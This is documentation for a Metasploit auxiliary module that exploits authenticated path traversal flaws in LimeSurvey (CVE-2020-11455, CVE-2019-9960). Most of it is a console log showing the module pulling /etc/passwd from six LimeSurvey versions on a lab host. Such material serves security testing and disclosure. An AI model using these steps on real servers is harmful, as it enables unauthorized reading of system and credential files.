## Vulnerable Application

This module exploits an authenticated path traversal vulnerability found in LimeSurvey versions between 4.0 and 4.1.11 with
CVE-2020-11455 or <= 3.15.9 with CVE-2019-9960, inclusive.

In CVE-2020-11455 the `getZipFile` function within the `filemanager` functionality allows for arbitrary file download. The file retrieved
may be deleted after viewing.

In CVE-2019-9960 the `szip` function within the `downloadZip` functionality allows for arbitrary file download.

This module has been verified against the following versions:

  * 4.1.11-200316
  * 3.15.0-181008
  * 3.9.0-180604
  * 3.6.0-180328
  * 3.0.0-171222
  * 2.70.0-170921

### Install

This application is straight forward to install.  An excellent writeup is available on
[howtoforge.com](https://www.howtoforge.com/tutorial/how-to-install-limesurvey-on-ubuntu-1804/)

Versions can be downloaded from [github](https://github.com/LimeSurvey/LimeSurvey/releases).

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use auxiliary/scanner/http/limesurvey_zip_traversals```
  4. Do: ```set file [file]```
  5. Do: ```set rhosts [ip]```
  6. Do: ```run```
  7. If the file is readable, you should retrieve a file from the application

## Options

### FILE

The file to attempt to retrieve

## Scenarios

### LimeSurvey 4.1.11, 3.15.0, 3.9.0, 3.6.0, 3.0.0, and 2.70.0 on Ubuntu 18.04

```
[*] Processing lime41.rb for ERB directives.
resource (lime41.rb)> use auxiliary/scanner/http/limesurvey_zip_traversals
resource (lime41.rb)> set rhosts 2.2.2.2
rhosts => 2.2.2.2
resource (lime41.rb)> set verbose true
verbose => true
resource (lime41.rb)> set targeturi /LimeSurvey-4.1.11-200316/
targeturi => /LimeSurvey-4.1.11-200316/
resource (lime41.rb)> run
[*] CSRF: YII_CSRF_TOKEN => SzF-eUl4RW1lU0h-aFZxWmNwbGZOREJrYUduZzI1WTaGH7eqrOmgcse5liKfPNZ8qqKkvenm5Fu6oxTSyVWDrQ==
[+] Login Successful
[*] Version Detected: 4.1.11
[*] Attempting to retrieve file
[+] File stored to: /home/h00die/.msf4/loot/20200408141207_default_2.2.2.2__164991.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (lime41.rb)> set targeturi /LimeSurvey-3.15.0-181008/
targeturi => /LimeSurvey-3.15.0-181008/
resource (lime41.rb)> run
[*] CSRF: YII_CSRF_TOKEN => SDNyc21VYXJONmIwbjFkOENmUzEyS1NMX3lPQ0VYRTJyfE0iGABAxOsuZhxGdZd59W3dNCVx2D6JABRxmu6dgw==
[+] Login Successful
[*] Version Detected: 3.15.0
[*] Attempting to retrieve file
[+] File stored to: /home/h00die/.msf4/loot/20200408141207_default_2.2.2.2__530709.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (lime41.rb)> set targeturi /LimeSurvey-3.9.0-180604/
targeturi => /LimeSurvey-3.9.0-180604/
resource (lime41.rb)> run
[*] CSRF: YII_CSRF_TOKEN => QldPa0lZM0o0cUV-STU4NWVoYVlDdHNtYmhmVVl6NW39a1wvfep0Ccsuz_gx9V1AnMjtADnprALM7qwvxUz3Wg==
[+] Login Successful
[*] Version Detected: 3.9.0
[*] Attempting to retrieve file
[+] File stored to: /home/h00die/.msf4/loot/20200408141208_default_2.2.2.2__407491.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (lime41.rb)> set targeturi /LimeSurvey-3.6.0-180328/
targeturi => /LimeSurvey-3.6.0-180328/
resource (lime41.rb)> run
[*] CSRF: YII_CSRF_TOKEN => SHJzSk81ak5rdWdONTJWV0VLQTlHcjRKeGNIaFlYREqfcU-BuMlPRimIHJipKDsrCF3i7j29J4bNFwxsYGD42A==
[+] Login Successful
[*] Version Detected: 3.6.0
[*] Attempting to retrieve file
[+] File stored to: /home/h00die/.msf4/loot/20200408141208_default_2.2.2.2__228237.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (lime41.rb)> set targeturi /LimeSurvey-3.0.0-171222/
targeturi => /LimeSurvey-3.0.0-171222/
resource (lime41.rb)> run
[*] CSRF: YII_CSRF_TOKEN => T1VkbDlhYU9IbkZHel9wd0JoVVl5RTUxQ2h2Mk9yN0-AXAtaTDCOMX8gWru7EmBHPBumgY0FG0vAFLwCwyeeuA==
[+] Login Successful
[*] Version Detected: 3.0.0
[*] Attempting to retrieve file
[+] File stored to: /home/h00die/.msf4/loot/20200408141209_default_2.2.2.2__611969.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (lime41.rb)> set targeturi /LimeSurvey-2.70.0-170921/
targeturi => /LimeSurvey-2.70.0-170921/
resource (lime41.rb)> run
[*] CSRF: YII_CSRF_TOKEN => elhvTzJaWGlJWU10WnBFajlTYmN5a1VHY1M0bDNJd1C2okYXL__0in7KMlmwY6_Iuk8sI7H7s2zQPZ5NiWW_Xg==
[+] Login Successful
[*] Version Detected: 2.70.0
[*] Attempting to retrieve file
[+] File stored to: /home/h00die/.msf4/loot/20200408141209_default_2.2.2.2__149900.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (lime41.rb)> md5sum ~/.msf4/loot/*
[*] exec: md5sum ~/.msf4/loot/*

3cf5f3492b7c77a77f74124bb4ccb528  /home/h00die/.msf4/loot/20200408141207_default_2.2.2.2__164991.txt
3cf5f3492b7c77a77f74124bb4ccb528  /home/h00die/.msf4/loot/20200408141207_default_2.2.2.2__530709.txt
3cf5f3492b7c77a77f74124bb4ccb528  /home/h00die/.msf4/loot/20200408141208_default_2.2.2.2__228237.txt
3cf5f3492b7c77a77f74124bb4ccb528  /home/h00die/.msf4/loot/20200408141208_default_2.2.2.2__407491.txt
3cf5f3492b7c77a77f74124bb4ccb528  /home/h00die/.msf4/loot/20200408141209_default_2.2.2.2__149900.txt
3cf5f3492b7c77a77f74124bb4ccb528  /home/h00die/.msf4/loot/20200408141209_default_2.2.2.2__611969.txt
msf5 auxiliary(scanner/http/limesurvey_zip_traversals) > cat /home/h00die/.msf4/loot/20200408141207_default_2.2.2.2__164991.txt
[*] exec: cat /home/h00die/.msf4/loot/20200408141207_default_2.2.2.2__164991.txt

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...snip...
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
```
